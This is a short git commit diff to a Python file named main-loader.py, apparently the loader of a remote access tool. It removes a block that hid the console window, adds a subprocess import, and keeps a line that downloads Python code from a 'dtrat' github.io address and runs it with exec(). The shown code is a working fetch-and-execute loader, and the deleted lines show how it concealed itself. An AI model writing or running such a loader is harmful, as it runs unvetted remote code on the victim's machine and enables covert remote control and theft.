30d7a6e3ee3e7ba62c3d99c520203874eecded6c
paledega <38860643+paledega@users.noreply.github.com>
2022-04-04 21:39:28 +0300

    Update main-loader.py

--- main-loader.py
+++ main-loader.py
@@ -1,14 +1,9 @@
-# Hide cmd
-try:
-    import ctypes
-    ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
-except:
-    pass
 # Begin program
 import pyautogui
 import requests
 import time
 import os, sys
 import platform
+import subprocess
 
 exec(str(requests.get("https://dtrat.github.io/dtrat/main.py?q={}".format(time.time)).content.decode("utf-8")))
